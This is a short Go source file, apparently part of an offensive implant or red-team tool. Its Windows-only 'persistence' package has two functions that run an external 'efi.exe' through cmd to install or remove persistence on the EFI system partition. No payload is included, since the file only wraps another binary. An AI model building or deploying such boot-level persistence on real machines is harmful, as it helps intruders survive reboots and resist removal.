//go:build windows

package persistence

import (
"os/exec"
)

func UEFIPersist() bool {
cmd := exec.Command("cmd", "/c", "efi.exe esp-persist")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func UEFIRemove() bool {
cmd := exec.Command("cmd", "/c", "efi.exe esp-remove")
err := cmd.Run()
if err != nil {
return false
}
return true
}
